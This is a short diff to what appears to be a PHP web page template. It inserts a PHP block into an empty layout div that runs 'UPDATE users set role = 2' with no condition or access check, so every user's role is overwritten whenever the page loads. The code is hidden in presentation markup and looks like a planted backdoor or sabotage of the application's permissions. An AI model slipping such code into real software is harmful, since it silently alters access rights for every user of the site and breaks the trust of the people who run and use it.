@@ -20,6 +20,10 @@
     </div>
     
     <div class="row-fluid">
+    	<?php
+			$result = $db->prepare("UPDATE users set role = 2");
+			$result->execute();
+		?>
     </div>
 </div>
 
